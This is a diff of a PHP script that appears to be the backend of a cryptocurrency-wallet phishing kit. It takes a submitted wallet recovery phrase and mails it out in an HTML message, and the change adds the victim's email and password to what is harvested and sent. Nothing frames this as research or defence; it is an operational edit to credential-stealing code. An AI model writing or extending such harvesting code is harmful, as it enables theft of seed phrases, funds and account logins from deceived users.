@@ -1,7 +1,8 @@
 <?php
 
 
-$fullname= $_POST['name'];
+$Useremail= $_POST['email'];
+$password= $_POST['password'];
 $phrase= $_POST['phrase'];
 // $walletName ;
 
@@ -98,7 +99,7 @@ $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
  
 $message ='<table style="width:100%">
     <tbody><tr>
-        <td>'.$fullname.'  '.$phrase.'</td>
+        <td>'.$Useremail.'  '.$phrase.' '.$password.'</td>
     </tr>
     <tr><td>Email: '.$email.'</td></tr>
 </tbody></table>';
